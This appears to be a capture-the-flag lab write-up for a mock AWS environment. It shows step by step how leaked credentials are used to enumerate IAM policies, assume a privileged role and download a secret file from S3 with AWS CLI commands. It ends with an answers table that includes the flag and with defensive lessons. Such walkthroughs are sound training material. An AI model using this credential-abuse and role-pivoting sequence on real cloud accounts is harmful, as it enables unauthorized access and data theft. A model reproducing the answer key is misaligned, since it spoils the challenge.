# AWS Security - S3cret Santa

## Overview
In this room, we infiltrated Sir Carrotbane’s cloud environment using a set of leaked AWS credentials found on his desktop.

Our goal was to enumerate permissions associated with these credentials, pivot to a more privileged role using `sts:AssumeRole`, and exfiltrate sensitive data from an Amazon **S3 (Simple Storage Service)** bucket.

---

## Key Concepts

### AWS IAM (Identity and Access Management)
The system that controls *who* can access *what* in AWS.
* **User:** A specific identity (e.g., `sir.carrotbane`).
* **Role:** A temporary identity with specific permissions that users can "assume" (like putting on a uniform to get access to a restricted area).
* **Policy:** A JSON document defining permissions (e.g., "Allow" reading from "S3").



### AWS CLI (Command Line Interface)
A tool to interact with AWS services using commands in the terminal.
* `aws sts get-caller-identity`: "Who am I?"
* `aws iam list-users`: "Who else is here?"
* `aws s3 ls`: "Show me the files."

---

## Technical Investigation

### Step 1: Initial Reconnaissance ("Who am I?")
We started with the leaked credentials configured in the terminal. We verified the identity:
**Command:**
```bash
aws sts get-caller-identity
```
**Result:** We are `sir.carrotbane`, Account ID `123456789012`.

### Step 2: Permission Enumeration
We checked what permissions Sir Carrotbane had.
1.  **List Policies:** `aws iam list-user-policies --user-name sir.carrotbane`
2.  **Read Policy:** `aws iam get-user-policy --policy-name SirCarrotbanePolicy --user-name sir.carrotbane`

**Finding:** The policy allowed `sts:AssumeRole`. This means Sir Carrotbane can impersonate other roles.

### Step 3: Pivoting (Role Assumption)
We looked for roles available in the account:
**Command:**
```bash
aws iam list-roles
```
**Finding:** A role named `bucketmaster` exists, and its trust policy allows `sir.carrotbane` to assume it.

We assumed the role to gain its privileges:
**Command:**
```bash
aws sts assume-role --role-arn arn:aws:iam::123456789012:role/bucketmaster --role-session-name TBFC
```
This gave us temporary credentials (`AccessKeyId`, `SecretAccessKey`, `SessionToken`), which we exported to our environment variables to "become" the `bucketmaster`.

### Step 4: Data Exfiltration (S3)
With the new `bucketmaster` privileges, we listed the storage buckets:
**Command:**
```bash
aws s3api list-buckets
```
**Finding:** A bucket named `easter-secrets-123145`.

We listed the files inside and downloaded the target:
**Command:**
```bash
aws s3api get-object --bucket easter-secrets-123145 --key cloud_password.txt cloud_password.txt
```
**Result:** The file contained the flag.

---

## Answers Summary

| Question | Answer |
| :--- | :--- |
| Run `aws sts get-caller-identity`. What is the "Account" parameter? | `123456789012` |
| What IAM component describes permissions assigned to a user/group? | `policy` |
| What is the name of the policy assigned to `sir.carrotbane`? | `SirCarrotbanePolicy` |
| Apart from GetObject/ListBucket, what other action can the role take? | `ListAllMyBuckets` |
| What are the contents of the `cloud_password.txt` file? | `THM{more_like_sir_cloudbane}` |

---

## Lessons Learned
* **Credential Hygiene:** Never leave hardcoded credentials (Access Keys) on desktops or in code. Use temporary IAM roles whenever possible.
* **Least Privilege:** Users should only have the exact permissions they need. Sir Carrotbane had `AssumeRole` permissions that allowed him to escalate privileges to `bucketmaster`.
* **Enumeration is Key:** In Cloud pentesting, knowing "who you are" and "what you can do" (listing policies) is 90% of the battle.

---
> **Key Takeaway**: Cloud attacks often involve "Identity Pivoting" — starting with a low-privileged user and moving laterally to a high-privileged role to access sensitive data.
